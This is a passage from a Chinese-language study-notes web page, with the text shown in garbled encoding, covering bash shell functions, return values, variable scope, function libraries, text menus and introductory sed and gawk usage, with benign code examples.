æ–‡ä»¶é€šå¸¸è¦æ‰§è¡Œä¸¤æ¬¡, ä¸€æ¬¡æ˜¯å½“ä½ ç™»å…¥ bash shell, å¦ä¸€æ¬¡æ˜¯å½“ä½ å¯åŠ¨ä¸€ä¸ª bash shell.</p><h1 id="ç¬¬17ç« -åˆ›å»ºå‡½æ•°"><a href="#ç¬¬17ç« -åˆ›å»ºå‡½æ•°" class="headerlink" title="ç¬¬17ç«  åˆ›å»ºå‡½æ•°"></a>ç¬¬17ç«  åˆ›å»ºå‡½æ•°</h1><h2 id="17-1-åŸºæœ¬çš„è„šæœ¬å‡½æ•°"><a href="#17-1-åŸºæœ¬çš„è„šæœ¬å‡½æ•°" class="headerlink" title="17.1 åŸºæœ¬çš„è„šæœ¬å‡½æ•°"></a>17.1 åŸºæœ¬çš„è„šæœ¬å‡½æ•°</h2><p><mark>å‡½æ•°</mark>æ˜¯ä¸€ä¸ªè„šæœ¬ä»£ç å—, ä½ å¯ä»¥ä¸ºå…¶å‘½åå¹¶åœ¨ä»£ç ä¸­ä»»ä½•ä½ç½®é‡ç”¨.</p><h3 id="17-1-1-åˆ›å»ºå‡½æ•°"><a href="#17-1-1-åˆ›å»ºå‡½æ•°" class="headerlink" title="17.1.1 åˆ›å»ºå‡½æ•°"></a>17.1.1 åˆ›å»ºå‡½æ•°</h3><p>æœ‰ä¸¤ç§æ ¼å¼å¯ä»¥åœ¨ bash shell è„šæœ¬ä¸­åˆ›å»ºå‡½æ•°:</p><p>ç¬¬ä¸€ç§æ ¼å¼é‡‡ç”¨å…³é”®å­— function:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span> &#123;<br>    commands<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ ¼å¼:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">name</span><span class="hljs-params">()</span></span> &#123;<br>    commands<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•°ååçš„ç©ºæ‹¬å·è¡¨æ˜æ­£åœ¨å®šä¹‰ä¸€ä¸ªå‡½æ•°.</p><h3 id="17-1-2-ä½¿ç”¨å‡½æ•°"><a href="#17-1-2-ä½¿ç”¨å‡½æ•°" class="headerlink" title="17.1.2 ä½¿ç”¨å‡½æ•°"></a>17.1.2 ä½¿ç”¨å‡½æ•°</h3><p>æŒ‡å®šå‡½æ•°å.</p><p>å¦‚æœåœ¨å‡½æ•°è¢«å®šä»¥å‰ä½¿ç”¨å‡½æ•°, ä¼šæ”¶åˆ°ä¸€æ¡é”™è¯¯ä¿¡æ¯.</p><p>å¦‚æœé‡å®šä¹‰äº†å‡½æ•°, æ–°å®šä¹‰ä¼šè¦†ç›–åŸæ¥å‡½æ•°çš„å®šä¹‰, ä¸”ä¸ä¼šäº§ç”Ÿä»»ä½•é”™è¯¯ä¿¡æ¯.</p><h2 id="17-2-è¿”å›å€¼"><a href="#17-2-è¿”å›å€¼" class="headerlink" title="17.2 è¿”å›å€¼"></a>17.2 è¿”å›å€¼</h2><p>bash shell ä¼šæŠŠå‡½æ•°å½“ä½œä¸€ä¸ªå°å‹è„šæœ¬, è¿è¡Œç»“æŸæ—¶ä¼šè¿”å›ä¸€ä¸ªé€€å‡ºçŠ¶æ€ç .</p><h3 id="17-2-1-é»˜è®¤é€€å‡ºçŠ¶æ€ç "><a href="#17-2-1-é»˜è®¤é€€å‡ºçŠ¶æ€ç " class="headerlink" title="17.2.1 é»˜è®¤é€€å‡ºçŠ¶æ€ç "></a>17.2.1 é»˜è®¤é€€å‡ºçŠ¶æ€ç </h3><p>é»˜è®¤æƒ…å†µä¸‹, å‡½æ•°çš„é€€å‡ºçŠ¶æ€ç æ˜¯å‡½æ•°ä¸­æœ€åä¸€æ¡å‘½ä»¤è¿”å›çš„æ¨å‡ºçŠ¶æ€ç .</p><p>ä½¿ç”¨å‡½æ•°çš„é»˜è®¤é€€å‡ºçŠ¶æ€ç æ˜¯å¾ˆå±é™©çš„.</p><h3 id="17-2-2-ä½¿ç”¨-return-å‘½ä»¤"><a href="#17-2-2-ä½¿ç”¨-return-å‘½ä»¤" class="headerlink" title="17.2.2 ä½¿ç”¨ return å‘½ä»¤"></a>17.2.2 ä½¿ç”¨ return å‘½ä»¤</h3><p>bash shell ç”¨ return å‘½ä»¤æ¥é€€å‡ºå‡½æ•°å¹¶è¿”å›ç‰¹å®šçš„é€€å‡ºçŠ¶æ€ç .</p><p>ä¸¤ä¸ªæ³¨æ„äº‹é¡¹:</p><ul><li>å‡½æ•°ä¸€ç»“æŸå°±å–è¿”å›å€¼</li><li>é€€å‡ºçŠ¶æ€ç å¿…é¡»æ˜¯ 0 ~ 255</li></ul><p>å¦‚æœåœ¨ä½¿ç”¨ <code>$?</code> å˜é‡æå–å‡½æ•°è¿”å›å€¼ä¹‹å‰æ‰§è¡Œäº†å…¶ä»–å‘½ä»¤, å‡½æ•°çš„è¿”å›å€¼å°±ä¼šä¸¢å¤±.</p><p>å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-keyword">function</span> db1 &#123;<br>    <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Enter a value: &quot;</span> value<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;doubling the value&quot;</span><br>    <span class="hljs-built_in">return</span> $[ <span class="hljs-variable">$value</span> * 2 ]<br>&#125;<br><br>db1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The new value is $?&quot;</span><br></code></pre></td></tr></table></figure><h3 id="17-2-3-ä½¿ç”¨å‡½æ•°è¾“å‡º"><a href="#17-2-3-ä½¿ç”¨å‡½æ•°è¾“å‡º" class="headerlink" title="17.2.3 ä½¿ç”¨å‡½æ•°è¾“å‡º"></a>17.2.3 ä½¿ç”¨å‡½æ•°è¾“å‡º</h3><p>è·å¾—å‡½æ•°çš„è¾“å‡º, å¹¶ä¿å­˜åœ¨å˜é‡ä¸­:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">result</span>=<span class="hljs-string">`db1`</span><br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span>=$(db1)<br></code></pre></td></tr></table></figure><p>è·å–è¾“å‡º, å’Œè¿”å›å€¼ä¸åŒ.</p><h2 id="17-3-åœ¨å‡½æ•°ä¸­ä½¿ç”¨å˜é‡"><a href="#17-3-åœ¨å‡½æ•°ä¸­ä½¿ç”¨å˜é‡" class="headerlink" title="17.3 åœ¨å‡½æ•°ä¸­ä½¿ç”¨å˜é‡"></a>17.3 åœ¨å‡½æ•°ä¸­ä½¿ç”¨å˜é‡</h2><h3 id="17-3-1-å‘å‡½æ•°ä¼ é€’å‚æ•°"><a href="#17-3-1-å‘å‡½æ•°ä¼ é€’å‚æ•°" class="headerlink" title="17.3.1 å‘å‡½æ•°ä¼ é€’å‚æ•°"></a>17.3.1 å‘å‡½æ•°ä¼ é€’å‚æ•°</h3><p>åŒæ ·è¿˜æ˜¯ç”¨ <code>$#</code>, <code>$1</code> è¿™äº›ç‰¹æ®Šå˜é‡.</p><p>åœ¨è„šæœ¬ä¸­æŒ‡å®šå‡½æ•°æ—¶, å¿…é¡»å°†å‚æ•°å’Œå‡½æ•°æ”¾åœ¨åŒä¸€è¡Œ:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">func1</span> <span class="hljs-variable">$value1</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>ç”±äºå‡½æ•°ä½¿ç”¨ç‰¹æ®Šå‚æ•°ç¯å¢ƒå˜é‡ä½œä¸ºè‡ªå·±çš„å‚æ•°å€¼, å› æ­¤å®ƒæ— æ³•ç›´æ¥è·å–è„šæœ¬åœ¨å‘½ä»¤è¡Œä¸­çš„å‚æ•°å€¼.</p><h3 id="17-3-2-åœ¨å‡½æ•°ä¸­å¤„ç†å˜é‡"><a href="#17-3-2-åœ¨å‡½æ•°ä¸­å¤„ç†å˜é‡" class="headerlink" title="17.3.2 åœ¨å‡½æ•°ä¸­å¤„ç†å˜é‡"></a>17.3.2 åœ¨å‡½æ•°ä¸­å¤„ç†å˜é‡</h3><p>å‡½æ•°ä¸­å®šä¹‰çš„å˜é‡ä¸æ™®é€šå˜é‡çš„ä½œç”¨åŸŸä¸åŒ.</p><p>å‡½æ•°ä½¿ç”¨ä¸¤ç§ç±»å‹çš„å˜é‡:</p><ul><li>å…¨å±€å˜é‡</li><li>å±€éƒ¨å˜é‡</li></ul><h4 id="1-å…¨å±€å˜é‡"><a href="#1-å…¨å±€å˜é‡" class="headerlink" title="1. å…¨å±€å˜é‡"></a>1. å…¨å±€å˜é‡</h4><p>å…¨å±€å˜é‡æ˜¯åœ¨ shell è„šæœ¬ä¸­ä»»ä½•åœ°æ–¹éƒ½æœ‰æ•ˆçš„å˜é‡.</p><p>é»˜è®¤æƒ…å†µä¸‹, åœ¨è„šæœ¬ä¸­å®šä¹‰çš„ä»»ä½•å˜é‡éƒ½æ˜¯å…¨å±€å˜é‡, åœ¨å‡½æ•°å¤–å®šä¹‰çš„å˜é‡å¯åœ¨å‡½æ•°å†…æ­£å¸¸è®¿é—®.</p><h4 id="2-å±€éƒ¨å˜é‡"><a href="#2-å±€éƒ¨å˜é‡" class="headerlink" title="2. å±€éƒ¨å˜é‡"></a>2. å±€éƒ¨å˜é‡</h4><p>æ— éœ€åœ¨å‡½æ•°ä¸­ä½¿ç”¨å…¨å±€å˜é‡, å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„ä»»ä½•å˜é‡éƒ½å¯ä»¥è¢«å£°æ˜æˆå±€éƒ¨å˜é‡, ä½¿ç”¨ local å…³é”®è¯:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">local</span> <span class="hljs-keyword">temp</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯åœ¨å˜é‡èµ‹å€¼è¯­å¥ä¸­ä½¿ç”¨ local å…³é”®å­—:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">local</span> temp=$[ $value + <span class="hljs-number">5</span> ]<br></code></pre></td></tr></table></figure><p>local å…³é”®è¯ä¿è¯äº†å˜é‡åªå±€é™åœ¨è¯¥å‡½æ•°ä¸­.</p><h2 id="17-4-æ•°ç»„å˜é‡å’Œå‡½æ•°"><a href="#17-4-æ•°ç»„å˜é‡å’Œå‡½æ•°" class="headerlink" title="17.4 æ•°ç»„å˜é‡å’Œå‡½æ•°"></a>17.4 æ•°ç»„å˜é‡å’Œå‡½æ•°</h2><h3 id="17-4-1-å‘å‡½æ•°ä¼ é€’æ•°ç»„å‚æ•°"><a href="#17-4-1-å‘å‡½æ•°ä¼ é€’æ•°ç»„å‚æ•°" class="headerlink" title="17.4.1 å‘å‡½æ•°ä¼ é€’æ•°ç»„å‚æ•°"></a>17.4.1 å‘å‡½æ•°ä¼ é€’æ•°ç»„å‚æ•°</h3><h3 id="17-4-2-ä»å‡½æ•°è¿”å›æ•°ç»„"><a href="#17-4-2-ä»å‡½æ•°è¿”å›æ•°ç»„" class="headerlink" title="17.4.2 ä»å‡½æ•°è¿”å›æ•°ç»„"></a>17.4.2 ä»å‡½æ•°è¿”å›æ•°ç»„</h3><h2 id="17-5-å‡½æ•°é€’å½’"><a href="#17-5-å‡½æ•°é€’å½’" class="headerlink" title="17.5 å‡½æ•°é€’å½’"></a>17.5 å‡½æ•°é€’å½’</h2><p>å‡½æ•°å¯ä»¥è°ƒç”¨è‡ªå·±æ¥å¾—åˆ°ç»“æœ.</p><h2 id="17-6-åˆ›å»ºåº“"><a href="#17-6-åˆ›å»ºåº“" class="headerlink" title="17.6 åˆ›å»ºåº“"></a>17.6 åˆ›å»ºåº“</h2><p>bash shell å…è®¸åˆ›å»ºå‡½æ•°åº“æ–‡ä»¶, ç„¶ååœ¨å¤šä¸ªè„šæœ¬ä¸­å¼•ç”¨è¯¥åº“æ–‡ä»¶.</p><p>ç¬¬ä¸€æ­¥æ˜¯åˆ›å»ºä¸€ä¸ªåŒ…å«è„šæœ¬ä¸­æ‰€éœ€å‡½æ•°çš„å…±ç”¨åº“æ–‡ä»¶.</p><p>å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># my script function</span><br><br><span class="hljs-keyword">function</span> addem &#123;<br>    <span class="hljs-built_in">echo</span> $[ <span class="hljs-variable">$1</span> + <span class="hljs-variable">$2</span> ]<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥æ˜¯åœ¨ç”¨è¿™ä¸ªå‡½æ•°çš„è„šæœ¬ä¸­åŒ…å«è¯¥åº“æ–‡ä»¶.</p><p>ä½¿ç”¨ source å‘½ä»¤, source å‘½ä»¤æœ‰ä¸ªå¿«æ·çš„åˆ«å, ç§°åš<mark>ç‚¹æ“ä½œç¬¦</mark> (dot operator):</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">. </span>./myfuncs<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ./myfuncs<br></code></pre></td></tr></table></figure><h2 id="17-7-åœ¨å‘½ä»¤è¡Œä¸Šä½¿ç”¨å‡½æ•°"><a href="#17-7-åœ¨å‘½ä»¤è¡Œä¸Šä½¿ç”¨å‡½æ•°" class="headerlink" title="17.7 åœ¨å‘½ä»¤è¡Œä¸Šä½¿ç”¨å‡½æ•°"></a>17.7 åœ¨å‘½ä»¤è¡Œä¸Šä½¿ç”¨å‡½æ•°</h2><p>ä¸€æ—¦åœ¨ shell ä¸­å®šä¹‰äº†å‡½æ•°, å°±å¯ä»¥åœ¨æ•´ä¸ªç³»ç»Ÿä¸­ä½¿ç”¨, æ— éœ€æ‹…å¿ƒè„šæœ¬æ˜¯ä¸æ˜¯åœ¨ PATH ç¯å¢ƒå˜é‡é‡Œ.</p><h3 id="17-7-1-åœ¨å‘½ä»¤è¡Œä¸Šåˆ›å»ºå‡½æ•°"><a href="#17-7-1-åœ¨å‘½ä»¤è¡Œä¸Šåˆ›å»ºå‡½æ•°" class="headerlink" title="17.7.1 åœ¨å‘½ä»¤è¡Œä¸Šåˆ›å»ºå‡½æ•°"></a>17.7.1 åœ¨å‘½ä»¤è¡Œä¸Šåˆ›å»ºå‡½æ•°</h3><p>å•è¡Œæ–¹å¼å®šä¹‰å‡½æ•°:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">function</span> divem &#123; <span class="hljs-built_in">echo</span> $[ <span class="hljs-variable">$1</span> / <span class="hljs-variable">$2</span> ]; &#125;</span><br></code></pre></td></tr></table></figure><p>åœ¨å‘½ä»¤è¡Œä¸Šå®šä¹‰å‡½æ•°æ—¶, å¿…é¡»åœ¨æ¯æ¡å‘½ä»¤ä¹‹ååŠ åˆ†å·, è¿™æ · shell æ‰çŸ¥é“åœ¨å“ªé‡Œæ˜¯å‘½ä»¤çš„èµ·æ­¢.</p><p>å¤šè¡Œæ–¹å¼å®šä¹‰:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">function</span> multem &#123;</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">echo</span> $[ <span class="hljs-variable">$1</span> * <span class="hljs-variable">$2</span> ]</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">&#125;</span><br></code></pre></td></tr></table></figure><p>åœ¨å‡½æ•°çš„å°¾éƒ¨ä½¿ç”¨èŠ±æ‹¬å·, shell å°±ä¼šçŸ¥é“ä½ å·²ç»å®Œæˆäº†å‡½æ•°çš„å®šä¹‰.</p><p>å¦‚æœä½ èµ·äº†ä¸€ä¸ªå’Œå†…å»ºå‡½æ•°æˆ–å¦ä¸€ä¸ªå‡½æ•°ç›¸åŒçš„åå­—, å‡½æ•°å°†ä¼šè¦†ç›–åŸæ¥çš„å‘½ä»¤.</p><h3 id="17-7-2-åœ¨-bashrc-æ–‡ä»¶ä¸­å®šä¹‰å‡½æ•°"><a href="#17-7-2-åœ¨-bashrc-æ–‡ä»¶ä¸­å®šä¹‰å‡½æ•°" class="headerlink" title="17.7.2 åœ¨ .bashrc æ–‡ä»¶ä¸­å®šä¹‰å‡½æ•°"></a>17.7.2 åœ¨ .bashrc æ–‡ä»¶ä¸­å®šä¹‰å‡½æ•°</h3><p>åœ¨å‘½ä»¤è¡Œä¸Šç›´æ¥å®šä¹‰ shell å‡½æ•°çš„æ˜æ˜¾ç¼ºç‚¹æ˜¯é€€å‡º shell æ—¶, å‡½æ•°å°±æ¶ˆå¤±äº†.</p><p>åªè¦æ˜¯åœ¨ shell è„šæœ¬ä¸­, éƒ½å¯ä»¥ç”¨ source å‘½ä»¤æ¥æ·»åŠ åº“æ–‡ä»¶.</p><h2 id="17-8-å®ä¾‹"><a href="#17-8-å®ä¾‹" class="headerlink" title="17.8 å®ä¾‹"></a>17.8 å®ä¾‹</h2><h3 id="17-8-1-ä¸‹è½½åŠå®‰è£…"><a href="#17-8-1-ä¸‹è½½åŠå®‰è£…" class="headerlink" title="17.8.1 ä¸‹è½½åŠå®‰è£…"></a>17.8.1 ä¸‹è½½åŠå®‰è£…</h3><h1 id="ç¬¬18ç« -å›¾å½¢åŒ–æ¡Œé¢ä¸­çš„è„šæœ¬ç¼–ç¨‹"><a href="#ç¬¬18ç« -å›¾å½¢åŒ–æ¡Œé¢ä¸­çš„è„šæœ¬ç¼–ç¨‹" class="headerlink" title="ç¬¬18ç«  å›¾å½¢åŒ–æ¡Œé¢ä¸­çš„è„šæœ¬ç¼–ç¨‹"></a>ç¬¬18ç«  å›¾å½¢åŒ–æ¡Œé¢ä¸­çš„è„šæœ¬ç¼–ç¨‹</h1><h2 id="18-1-åˆ›å»ºæ–‡æœ¬èœå•"><a href="#18-1-åˆ›å»ºæ–‡æœ¬èœå•" class="headerlink" title="18.1 åˆ›å»ºæ–‡æœ¬èœå•"></a>18.1 åˆ›å»ºæ–‡æœ¬èœå•</h2><p>åˆ›å»ºäº¤äº’å¼ shell è„šæœ¬æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨èœå•.</p><p>é€šå¸¸èœå•è„šæœ¬ä¼šæ¸…ç©ºæ˜¾ç¤ºåŒºåŸŸ, ç„¶åæ˜¾ç¤ºå¯ç”¨çš„é€‰é¡¹åˆ—è¡¨.</p><p>shell è„šæœ¬èœå•çš„æ ¸å¿ƒæ˜¯ case å‘½ä»¤.</p><h3 id="18-1-1-åˆ›å»ºèœå•å¸ƒå±€"><a href="#18-1-1-åˆ›å»ºèœå•å¸ƒå±€" class="headerlink" title="18.1.1 åˆ›å»ºèœå•å¸ƒå±€"></a>18.1.1 åˆ›å»ºèœå•å¸ƒå±€</h3><p>åœ¨åˆ›å»ºèœå•ä¹‹å‰, é€šå¸¸è¦å…ˆæ¸…ç©ºæ˜¾ç¤ºå™¨ä¸Šå·²æœ‰çš„å†…å®¹, è¿™æ ·å°±èƒ½åœ¨å¹²å‡€çš„ç¯å¢ƒä¸­æ˜¾ç¤ºèœå•.</p><p>åœ¨ echo ä¸­ä½¿ç”¨éæ‰“å°å­—ç¬¦, å¿…é¡»ç”¨ <code>-e</code> é€‰é¡¹:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">clear</span><br><span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;1.\tDisplay disk space&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºèœå•çš„æœ€åä¸€æ­¥æ˜¯è·å–ç”¨æˆ·è¾“å…¥, ä½¿ç”¨ read å‘½ä»¤.</p><h1 id="ç¬¬19ç« -åˆè¯†-sed-å’Œ-gawk"><a href="#ç¬¬19ç« -åˆè¯†-sed-å’Œ-gawk" class="headerlink" title="ç¬¬19ç«  åˆè¯† sed å’Œ gawk"></a>ç¬¬19ç«  åˆè¯† sed å’Œ gawk</h1><h2 id="19-1-æ–‡æœ¬å¤„ç†"><a href="#19-1-æ–‡æœ¬å¤„ç†" class="headerlink" title="19.1 æ–‡æœ¬å¤„ç†"></a>19.1 æ–‡æœ¬å¤„ç†</h2><h3 id="19-1-1-sed-ç¼–è¾‘å™¨"><a href="#19-1-1-sed-ç¼–è¾‘å™¨" class="headerlink" title="19.1.1 sed ç¼–è¾‘å™¨"></a>19.1.1 sed ç¼–è¾‘å™¨</h3><p>sed ç¼–è¾‘å™¨è¢«ç§°ä½œæµç¼–è¾‘å™¨ (stream editor), å’Œäº¤äº’å¼ç¼–è¾‘å™¨ (å¦‚ vim) æ°å¥½ç›¸å.</p><p>sed ç¼–è¾‘å™¨çš„æ“ä½œ:</p><ol><li>ä¸€æ¬¡ä»è¾“å…¥ä¸­è¯»å–ä¸€è¡Œæ•°æ®</li><li>æ ¹æ®æ‰€æä¾›çš„ç¼–è¾‘å™¨å‘½ä»¤åŒ¹é…æ•°æ®</li><li>æŒ‰ç…§å‘½ä»¤ä¿®æ”¹æµä¸­çš„æ•°æ®</li><li>å°†æ–°çš„æ•°æ®è¾“å‡ºåˆ° STDOUT</li></ol><p>å‘½ä»¤æ ¼å¼:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">sed options <span class="hljs-keyword">script</span> <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>å¯ç”¨é€‰é¡¹:</p><ul><li><code>-e script</code>   åœ¨å¤„ç†è¾“å…¥æ—¶ï¼Œå°† script ä¸­æŒ‡å®šçš„å‘½ä»¤æ·»åŠ åˆ°å·²æœ‰çš„å‘½ä»¤ä¸­</li><li><code>-f file</code>     åœ¨å¤„ç†è¾“å…¥æ—¶ï¼Œå°† file ä¸­æŒ‡å®šçš„å‘½ä»¤æ·»åŠ åˆ°å·²æœ‰çš„å‘½ä»¤ä¸­</li><li><code>-n</code>          ä¸äº§ç”Ÿå‘½ä»¤è¾“å‡ºï¼Œä½¿ç”¨ print å‘½ä»¤æ¥å®Œæˆè¾“å‡º</li></ul><p>sed ç¼–è¾‘å™¨å¹¶ä¸ä¼šä¿®æ”¹æ–‡æœ¬æ–‡ä»¶çš„æ•°æ®ï¼Œå®ƒåªä¼šå°†ä¿®æ”¹åçš„æ•°æ®å‘é€åˆ° STDOUT.</p><p>æ›¿æ¢å‘½ä»¤, å¦‚:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a test&quot;</span> | sed <span class="hljs-string">&#x27;s/test/big test/&#x27;</span></span> <br></code></pre></td></tr></table></figure><h4 id="æ‰§è¡Œå¤šä¸ªå‘½ä»¤"><a href="#æ‰§è¡Œå¤šä¸ªå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå¤šä¸ªå‘½ä»¤"></a>æ‰§è¡Œå¤šä¸ªå‘½ä»¤</h4><p>æ‰§è¡Œå¤šä¸ªå‘½ä»¤æ—¶ä½¿ç”¨ <code>-e</code> é€‰é¡¹:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed -e <span class="hljs-string">&#x27;s/brown/green/; s/dog/cat/&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>å‘½ä»¤ç”¨åˆ†å· <code>;</code> éš”å¼€ï¼Œä¸”å¿…é¡»ä½äºå‘½ä»¤æœ«å°¾ï¼Œä¸èƒ½æœ‰ç©ºæ ¼.</p><h4 id="å¤šè¡Œå‘½ä»¤"><a href="#å¤šè¡Œå‘½ä»¤" class="headerlink" title="å¤šè¡Œå‘½ä»¤"></a>å¤šè¡Œå‘½ä»¤</h4><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed -e &#x27;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/brown/green/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/fox/elephant/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/dog/cat/<span class="hljs-string">&#x27; data1.txt</span></span><br></code></pre></td></tr></table></figure><h4 id="ä»æ–‡ä»¶ä¸­è·å–å‘½ä»¤"><a href="#ä»æ–‡ä»¶ä¸­è·å–å‘½ä»¤" class="headerlink" title="ä»æ–‡ä»¶ä¸­è·å–å‘½ä»¤"></a>ä»æ–‡ä»¶ä¸­è·å–å‘½ä»¤</h4><p>æ¯ä¸ªå‘½ä»¤å ä¸€è¡Œï¼Œå¯ä»¥ç»™æ–‡ä»¶æ·»åŠ åç¼€ <code>.sed</code></p><h3 id="19-1-2-gawk-ç¨‹åº"><a href="#19-1-2-gawk-ç¨‹åº" class="headerlink" title="19.1.2 gawk ç¨‹åº"></a>19.1.2 gawk ç¨‹åº</h3><p>åœ¨æ‰€æœ‰çš„å‘è¡Œç‰ˆä¸­éƒ½æ²¡æœ‰é»˜è®¤å®‰è£… gawk ç¨‹åºã€‚</p><p>gawk æ˜¯åŸå§‹ awk çš„ GNU ç‰ˆæœ¬ã€‚</p><p>gawk æä¾›äº†ä¸€ç§ç¼–ç¨‹è¯­è¨€ã€‚</p><p>åŸºæœ¬æ ¼å¼:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">gawk <span class="hljs-keyword">option</span> program <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>å¯ç”¨é€‰é¡¹:</p><ul><li><code>-F FS</code>, æŒ‡å®šè¡Œä¸­åˆ’åˆ†æ•°æ®å­—æ®µçš„å­—æ®µåˆ†éš”ç¬¦</li><li><code>-f file</code>, ä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–ç¨‹åº</li><li><code>-v var=value</code>, å®šä¹‰ gawk ç¨‹åºä¸­çš„ä¸€ä¸ªå˜é‡åŠå…¶é»˜è®¤å€¼</li><li><code>-mf N</code>, æŒ‡å®šè¦å¤„ç†æ–‡ä»¶ä¸­çš„æœ€å¤§å­—æ®µæ•°</li><li><code>-mr N</code>, æŒ‡å®šæ•°æ®æ–‡ä»¶ä¸­çš„æœ€å¤§æ•°æ®è¡Œæ•°</li><li><code>-W keyword</code>, æŒ‡å®š gawk ä¸­å…¼å®¹æ¨¡å¼æˆ–è­¦å‘Šç­‰çº§</li></ul><p>gawk çš„è„šæœ¬ç”¨ä¸€å¯¹èŠ±æ‹¬å·æ¥å®šä¹‰ï¼Œå¿…é¡»æŠŠè„šæœ¬å‘½ä»¤æ”¾åœ¨ä¸€å¯¹èŠ±æ‹¬å·ä¸­ <code>&#123;&#125;</code>.</p><p>gawk å‘½ä»¤è¡Œå‡å®šè„šæœ¬æ˜¯å•ä¸ªæ–‡æœ¬å­—ç¬¦ä¸², å› æ­¤è¿˜éœ€è¦æŠŠè„šæœ¬æ”¾åˆ°å•å¼•å·ä¸­:</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ gawk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello World&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>gawk ä¼šä» STDIN ç­‰å¾…è¾“å…¥æ•°æ®ã€‚</p><p>gawk ä¼šå¯¹æ•°æ®ä¸­çš„æ¯è¡Œæ–‡æœ¬æ‰§è¡Œç¨‹åº.</p><p>ä½¿ç”¨ <code>Ctrl + D</code> ç»ˆæ­¢ç¨‹åº.</p><h4 id="ä½¿ç”¨æ•°æ®å­—æ®µå˜é‡"><a 